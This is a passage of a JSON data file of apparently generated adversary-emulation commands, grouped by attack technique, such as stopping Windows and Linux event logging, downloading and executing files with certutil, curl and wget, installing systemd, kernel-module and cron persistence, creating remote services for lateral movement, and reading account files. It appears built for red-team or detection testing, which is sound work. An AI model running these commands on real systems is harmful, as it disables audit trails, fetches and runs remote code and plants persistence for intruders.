      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "93d35857-a310-4919-83a6-63aa330dabea",
      "ttp_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_name": "Impair Defenses",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "sc stop eventlog",
      "description": "Stops the Windows Event Log service to prevent event logging.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The Event Log service is stopped. New events will not be written to system, security, or application logs until the service is restarted. This may cause system instability or loss of audit trail.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:25.121857",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "aae8a606-7172-464a-b387-d020f7519a77",
      "ttp_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_name": "Impair Defenses",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "taskkill /f /im svchost.exe /fi \"services eq eventlog\"",
      "description": "Forcibly terminates the svchost.exe process hosting the Event Log service.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The host process for the Event Log service is killed, immediately halting all event logging. Other services in the same svchost instance may also be disrupted. System may log recovery attempts or become unstable.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:25.121857",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "40826588-f6f9-4cc1-974b-7c1c4d9ad764",
      "ttp_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_name": "Impair Defenses",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"Get-WmiObject Win32_Thread -Filter \\\"ProcessId = (Get-WmiObject Win32_Service -Filter 'Name=\\'eventlog\\'').ProcessId\\\" | ForEach-Object { $_.Get() }; Get-WmiObject Win32_Thread -Filter \\\"ProcessId = (Get-WmiObject Win32_Service -Filter 'Name=\\'eventlog\\'').ProcessId AND ThreadState=2\\\" | ForEach-Object { Invoke-WmiMethod -Path $_.__PATH -Name Terminate }\"",
      "description": "Suspends running threads of the Event Log service by identifying and terminating them via WMI.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Threads associated with the Event Log service that are in a running state are terminated, impairing the service's ability to log events without fully stopping the service or killing the process. This may cause partial logging failure and evade simple service state checks.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:25.121857",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "41f58794-dcbe-4c65-b920-b440cf89115c",
      "ttp_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_name": "Impair Defenses",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "sudo systemctl stop rsyslog",
      "description": "Stops the rsyslog service to prevent system log collection",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The rsyslog service halts, preventing new log entries from being written to /var/log. Existing logs remain intact but no new data is collected.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:57.444167",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "715b4ac0-2ad0-4fd1-8044-8cafe223bd19",
      "ttp_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_name": "Impair Defenses",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "sudo kill -STOP $(pgrep -f 'rsyslogd')",
      "description": "Suspends the rsyslog daemon process using SIGSTOP signal",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The rsyslog daemon process is suspended and will not process new log messages until resumed with SIGCONT.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:57.444167",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "2161a5ca-5d51-431b-b34e-2fb11436ef08",
      "ttp_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_id": "6906e268-8fe8-41d8-a75f-5e69ffdcf1da",
      "technique_name": "Impair Defenses",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "sudo systemctl stop systemd-journald",
      "description": "Stops the systemd-journald service to disable structured logging",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The systemd-journald service stops, preventing collection of structured logs. System messages may still appear via kernel log buffer but are not persisted systematically.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:25:57.444167",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "5e8c5607-4560-4b53-be2f-f966d7d2c2ad",
      "ttp_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/tool.exe %TEMP%\\update.exe",
      "description": "Download a file using certutil, a built-in Windows utility often abused for file retrieval during software deployment.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from a local server to the user's temp directory. Fails silently if network is unreachable or server is down. Uses built-in certutil to avoid external tools.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:12.851334",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "7824fffd-8fd6-4142-80d0-524e82374331",
      "ttp_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path '%TEMP%\\config.txt' -DestinationPath '%TEMP%\\deploy.zip' -Force\"",
      "description": "Create a ZIP archive of a configuration file to simulate bundling software components for deployment.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a compressed archive of a local file. Uses built-in PowerShell Compress-Archive with -Force to overwrite if needed. Safe and reversible.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:12.851850",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "1b77c346-6338-4073-8ebe-013ea9fc0865",
      "ttp_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "windows",
      "command": "cmd.exe /c \"mkdir %TEMP%\\agent 2>NUL && copy /Y %TEMP%\\update.exe %TEMP%\\agent\\service.exe && start %TEMP%\\agent\\service.exe\"",
      "description": "Simulate deployment of an executable to a new directory and execute it using native Windows batch commands.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a subdirectory, copies a previously downloaded file (simulated), and executes it. Uses only built-in Windows commands. Execution is visible but non-destructive if the source file is benign.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:12.851850",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "37d29378-0952-48c4-a179-3eea73a8f7dc",
      "ttp_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "linux",
      "command": "curl -s http://10.0.0.1/tool.sh -o /tmp/tool.sh && chmod +x /tmp/tool.sh && /tmp/tool.sh",
      "description": "Download and execute a shell script from a remote server using curl",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a script to /tmp, makes it executable, and runs it. Simulates deployment of a tool from a remote server. Uses benign script content in testing.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:29:43.440432",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "0c73fb6a-1985-4f7d-8c45-7c88801f792b",
      "ttp_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "linux",
      "command": "wget -q http://10.0.0.1/agent.tar.gz -O /tmp/agent.tar.gz && tar -xzf /tmp/agent.tar.gz -C /tmp && /tmp/agent/deploy.sh",
      "description": "Download a compressed tool package, extract it, and run a deployment script",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Fetches a tarball, extracts it to /tmp, and executes a deployment script. Simulates use of standard tooling to roll out software components across systems.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:29:43.440432",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "ddb9b1f3-fce5-4958-a7a0-88539c05d76c",
      "ttp_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_id": "cec5ff34-7aee-4042-b2bf-d4f1223d560d",
      "technique_name": "Software Deployment Tools",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo '[Unit]\\nDescription=Malicious Agent\\n[Service]\\nExecStart=/bin/sh -c \"while true; do sleep 60; done\"\\n[Install]\\nWantedBy=multi-user.target' > /tmp/malicious.service && sudo mv /tmp/malicious.service /etc/systemd/system/malicious.service && sudo systemctl daemon-reload && sudo systemctl enable --now malicious.service",
      "description": "Install a persistent service using systemd to maintain long-running execution",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a systemd service file that runs a harmless loop, moves it to systemd config, and enables it. Simulates persistence via service installation. Requires root privileges for file placement and systemctl operations.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:29:43.440432",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.666,
      "validated": true
    },
    {
      "id": "b40498e8-ffd6-4182-986c-492a386ff5b3",
      "ttp_id": "c30dc268-365a-429e-9f4e-0f55030ae53c",
      "technique_id": "c30dc268-365a-429e-9f4e-0f55030ae53c",
      "technique_name": "Boot or Logon Autostart Execution",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "sudo insmod /lib/modules/$(uname -r)/extra/wintapix.ko",
      "description": "Manually load the WINTAPIX kernel module using insmod",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The kernel module wintapix.ko is loaded into the running kernel if the file exists and is compatible. Requires root privileges. No persistence across reboots unless configured.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:38:01.605464",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.652,
      "validated": true
    },
    {
      "id": "3d59275a-289c-4f62-807a-f2bb0cdd643f",
      "ttp_id": "c30dc268-365a-429e-9f4e-0f55030ae53c",
      "technique_id": "c30dc268-365a-429e-9f4e-0f55030ae53c",
      "technique_name": "Boot or Logon Autostart Execution",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo 'wintapix' | sudo tee -a /etc/modules",
      "description": "Add wintapix module to /etc/modules to load at boot",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The module name 'wintapix' is appended to /etc/modules, causing the system to load it at boot via modprobe. This establishes persistence. Requires root.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:38:01.605464",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.652,
      "validated": true
    },
    {
      "id": "beace50c-8e3a-4be0-8fb0-b56d122567e6",
      "ttp_id": "c30dc268-365a-429e-9f4e-0f55030ae53c",
      "technique_id": "c30dc268-365a-429e-9f4e-0f55030ae53c",
      "technique_name": "Boot or Logon Autostart Execution",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo 'wintapix' | sudo tee /etc/modules-load.d/wintapix.conf",
      "description": "Use systemd modules-load.d to load WINTAPIX module at boot",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a configuration file in /etc/modules-load.d/ that instructs systemd to load the wintapix module during boot. This is a modern Linux persistence method. Requires root.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:38:01.605464",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.652,
      "validated": true
    },
    {
      "id": "b96a4a56-65bb-4c83-b6ec-31954ec2f84a",
      "ttp_id": "25483796-42eb-4135-9c52-60e39c25e9e3",
      "technique_id": "25483796-42eb-4135-9c52-60e39c25e9e3",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "powershell -Command \"Write-Output 'Test execution via PowerShell on Linux'\"",
      "description": "Basic PowerShell command execution on Linux to simulate benign attacker activity",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a test message to stdout, demonstrating PowerShell is active and executing commands",
      "source": "langchain",
      "generated_at": "2025-12-31T22:36:32.418150",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.649,
      "validated": true
    },
    {
      "id": "0fec53f3-7561-46f4-8506-d03ef25a61fe",
      "ttp_id": "25483796-42eb-4135-9c52-60e39c25e9e3",
      "technique_id": "25483796-42eb-4135-9c52-60e39c25e9e3",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "powershell -EncodedCommand \"dwBpAHQAZABvAHUAdAAgACcAVABlAHMAdAAgAGIAeQBwAGEAcwBzACAAdgBpAGEAIABFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAnAA==\"",
      "description": "Intermediate: Execute a base64-encoded PowerShell command that outputs a test bypass message",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes and runs the PowerShell command 'Write-Output 'Test bypass via EncodedCommand'', simulating obfuscated execution",
      "source": "langchain",
      "generated_at": "2025-12-31T22:36:32.418150",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.649,
      "validated": true
    },
    {
      "id": "837e82a1-d4d5-4f79-b33b-73e0986218d1",
      "ttp_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "sc.exe \\192.168.1.100 create TestService binPath= \"cmd.exe /c echo Lateral movement via service > %TEMP%\\\\test_service.txt\" start= auto",
      "description": "Creates a service on a remote machine using sc.exe with a benign command to simulate lateral movement.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A service named 'TestService' is created on the remote host (192.168.1.100). On start, it writes a line to a file in the target's %TEMP% directory. No payload is malicious, but service creation requires admin rights.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.281873",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.646,
      "validated": true
    },
    {
      "id": "d607122b-ff87-4835-a7cb-b9448a81b465",
      "ttp_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "sc.exe \\192.168.1.100 start TestService",
      "description": "Starts the previously created service on the remote machine to execute the lateral movement action.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The remote service 'TestService' starts and executes its command, creating the test file in %TEMP%. The service runs once and exits. This simulates execution via remote service.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.281873",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.646,
      "validated": true
    },
    {
      "id": "5147d346-ca41-4ab4-8397-9a92a3cf8c61",
      "ttp_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "powershell -Command \"try { $svcName = 'TempAgent'; $cmd = 'echo Test from remote PS service > $env:TEMP\\\\ps_service_test.txt'; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); $null = sc.exe \\192.168.1.100 create $svcName binPath= 'powershell.exe -EncodedCommand ' + $encoded start= auto; Start-Sleep 1; $null = sc.exe \\192.168.1.100 start $svcName; Remove-Item 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$svcName' -Recurse -ErrorAction SilentlyContinue } catch { exit 1 }\"",
      "description": "Advanced: Creates and starts a remote service using PowerShell with encoded command, then cleans up the service registry entry.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A remote service is created and started via PowerShell with an encoded command that writes a test file. After execution, the service registry key is removed locally (not on remote) to simulate cleanup. Note: Full cleanup on remote would require additional steps, but registry removal is attempted only locally for safety. The command uses proper escaping and error handling.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:28:13.281873",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.646,
      "validated": true
    },
    {
      "id": "99471728-3ef5-4d5e-b2fe-5fb9f909f58c",
      "ttp_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "ssh user@192.168.1.10 'echo \"lateral movement via SSH\" > /tmp/test_lateral.txt'",
      "description": "Basic SSH command to execute a simple echo on a remote host to simulate lateral movement.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Connects to the remote host via SSH and creates a test file in /tmp. No damage is done; operation is non-persistent and visible.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:29:43.436401",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.646,
      "validated": true
    },
    {
      "id": "276f72c0-5e41-44a3-8737-4b81c103bcfa",
      "ttp_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "scp /tmp/local_data.txt user@192.168.1.10:/tmp/stage_data.txt && ssh user@192.168.1.10 'cat /tmp/stage_data.txt | base64'",
      "description": "Intermediate use of SCP to copy a file and SSH to remotely process it, simulating data staging and execution during lateral movement.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Securely copies a local file to a remote system and executes a harmless base64 encoding of its contents. Uses common sysadmin tools for lateral transit.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:29:43.437407",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.646,
      "validated": true
    },
    {
      "id": "b252930b-0a7e-42e9-8718-b38b9d57eec2",
      "ttp_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_id": "6902c33d-7ef5-4632-bad5-eb4e8ebb6f4a",
      "technique_name": "Remote Services",
      "tactic": "Lateral Movement",
      "platform": "linux",
      "command": "ssh root@192.168.1.10 'systemctl start sshd 2>/dev/null || true; echo \"$(date): Service check\" >> /var/log/lateral_test.log'",
      "description": "Advanced command leveraging SSH with root access to verify/start a service and log activity, simulating privileged lateral movement.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Connects as root to a remote host, ensures SSH service is running, and appends a timestamped log entry. Minimal risk as it only starts an existing service and logs benign data.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:29:43.437407",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.646,
      "validated": true
    },
    {
      "id": "f2cd9b3f-5572-4cc3-94ec-aed32bbf78df",
      "ttp_id": "6a461787-03c4-46a3-93a4-c91d1e3a7871",
      "technique_id": "6a461787-03c4-46a3-93a4-c91d1e3a7871",
      "technique_name": "Modify Registry",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo 'echo \"persistence test\" >> /tmp/persistence.log' >> ~/.bashrc",
      "description": "Appends a benign command to .bashrc to simulate registry-based persistence via shell profile modification",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command appends a logging echo statement to the current user's .bashrc file. On each shell login, the message will be written to /tmp/persistence.log. This simulates persistence using a common Linux startup file.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:39:25.904536",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.645,
      "validated": true
    },
    {
      "id": "0efec2f0-3758-4d83-8020-e0bf27871347",
      "ttp_id": "6a461787-03c4-46a3-93a4-c91d1e3a7871",
      "technique_id": "6a461787-03c4-46a3-93a4-c91d1e3a7871",
      "technique_name": "Modify Registry",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo 'if ! grep -q \"persistence_marker\" ~/.profile; then echo \\\"#persistence_marker\\\\necho \\\\\\\"persistence check\\\\\\\" >> /tmp/persistence_marker.log\\\" >> ~/.profile; fi' | sh",
      "description": "Safely appends a conditional persistence command to .profile to avoid duplicate entries",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Checks if a marker exists in .profile before appending a logging command. Ensures idempotency and prevents infinite loops or file bloat. The command logs a message on each shell login.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:39:25.905580",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.645,
      "validated": true
    },
    {
      "id": "f57bd6b6-370a-40ea-9971-5dcac7001b82",
      "ttp_id": "7ae037f4-11f6-495b-aeaa-58cccdb65901",
      "technique_id": "7ae037f4-11f6-495b-aeaa-58cccdb65901",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo '*/5 * * * * /bin/sh -c \"echo \\\"Test beacon at $(date)\\\" >> /tmp/cron_beacon.log\"' | crontab -",
      "description": "Adds a cron job that executes every 5 minutes to simulate periodic beaconing via cron, a common persistence mechanism.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A user-level cron job is installed that appends a timestamped message to /tmp/cron_beacon.log every 5 minutes. No elevated privileges are required.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:38:28.862796",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "2294a54e-1fbb-425d-890d-f0ce1be7e33e",
      "ttp_id": "7ae037f4-11f6-495b-aeaa-58cccdb65901",
      "technique_id": "7ae037f4-11f6-495b-aeaa-58cccdb65901",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "sudo sh -c 'printf \"[Unit]\\nDescription=Mock Persistent Service\\n[Service]\\nExecStart=/bin/sh -c \\\"while true; do echo \\\\\\\"Heartbeat $(date)\\\\\\\" >> /tmp/systemd_mock.log; sleep 60; done\\\"\\n[Install]\\nWantedBy=multi-user.target\" > /etc/systemd/system/mock-persistence.service && systemctl daemon-reload && systemctl enable mock-persistence.service && systemctl start mock-persistence.service'",
      "description": "Creates and activates a systemd service to maintain persistence, a common technique for root-level persistence on Linux.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A systemd service file is written to /etc/systemd/system, enabled, and started. It logs a heartbeat every 60 seconds. Requires sudo to write to /etc/systemd and manage services. Safe as it uses only shell and systemd tools.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:38:28.863302",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "31a5852c-bd67-45f9-84e2-e022f1919f75",
      "ttp_id": "3121007b-151b-4f9b-b11a-ba42dfc59b16",
      "technique_id": "3121007b-151b-4f9b-b11a-ba42dfc59b16",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "tar -czf $HOME/collected_data.tar.gz -C $HOME/Documents .",
      "description": "Basic archiving of user documents into a gzipped tarball.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a compressed archive named collected_data.tar.gz in the user's home directory containing the contents of the Documents folder.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:35:36.832963",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "3b32cb95-b685-44bb-88e6-3f216b5ea731",
      "ttp_id": "3121007b-151b-4f9b-b11a-ba42dfc59b16",
      "technique_id": "3121007b-151b-4f9b-b11a-ba42dfc59b16",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "zip -r -P 'Password123' /tmp/collected.zip /tmp/staged_data/",
      "description": "Intermediate: Password-protected ZIP archive of collected data using zip command.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Recursively compresses the /tmp/staged_data/ directory into a password-protected ZIP file at /tmp/collected.zip. The password is set but not securely stored in this example.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:35:36.832963",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "5e866e9d-2739-4d6f-9835-32ac858d3045",
      "ttp_id": "3121007b-151b-4f9b-b11a-ba42dfc59b16",
      "technique_id": "3121007b-151b-4f9b-b11a-ba42dfc59b16",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "find /tmp/input_data -type f -name '*.txt' -exec tar -rf /tmp/archive.tar {} \\+ && gzip /tmp/archive.tar && echo 'Archiving complete' > /tmp/status.log",
      "description": "Advanced: Chains find with tar to selectively archive specific files, then compresses with gzip and logs completion.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Finds all .txt files in /tmp/input_data, appends them to archive.tar, compresses the archive to archive.tar.gz, and writes a completion message to status.log.",
      "source": "langchain",
      "generated_at": "2025-12-31T22:35:36.832963",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "1d710ab5-3892-427c-8a42-b7c44e35333e",
      "ttp_id": "4a1464de-8643-4583-bfd7-463b43f50ba5",
      "technique_id": "4a1464de-8643-4583-bfd7-463b43f50ba5",
      "technique_name": "Account Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "cat /etc/passwd",
      "description": "Basic account discovery by reading the local user database file",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs all user account entries from /etc/passwd, including system and regular users",
      "source": "langchain",
      "generated_at": "2025-12-31T22:36:32.419672",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "46e0503b-6995-43f4-a1f0-82a432eda580",
      "ttp_id": "4a1464de-8643-4583-bfd7-463b43f50ba5",
      "technique_id": "4a1464de-8643-4583-bfd7-463b43f50ba5",
      "technique_name": "Account Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "getent passwd",
      "description": "Intermediate account discovery using getent to query system user databases, including LDAP or NIS if configured",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists all user accounts known to the system, including those from network directory services",
      "source": "langchain",
      "generated_at": "2025-12-31T22:36:32.419672",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "adc96402-feb3-4b09-8700-f2c6a41f123e",
      "ttp_id": "4a1464de-8643-4583-bfd7-463b43f50ba5",
      "technique_id": "4a1464de-8643-4583-bfd7-463b43f50ba5",
      "technique_name": "Account Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "getent passwd | awk -F: '$3 >= 1000 && $3 < 65534 {print $1, $3, $6}'",
      "description": "Advanced account discovery filtering for non-system, regular user accounts with UID >= 1000 and < 65534, showing username, UID, and home directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints a filtered list of interactive user accounts, excluding system and reserved UIDs",
      "source": "langchain",
      "generated_at": "2025-12-31T22:36:32.419672",
      "agent_id": "fd9f9b7f-2d9d-49f5-aeed-7cec90ce4a06",
      "confidence_score": 0.624,
      "validated": true
    },
    {
      "id": "eb48b018-3184-4617-9849-7e82eb985f62",
      "ttp_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
      "technique_name": "Remote Desktop Protocol",
      "tactic": "Lateral Movement",
      "platform": "windows",
      "command": "mstsc.exe /v:192.168.1.100",
      "description": "Initiate a basic Remote Desktop connection to a target IP address",
      "requires_admin": false,
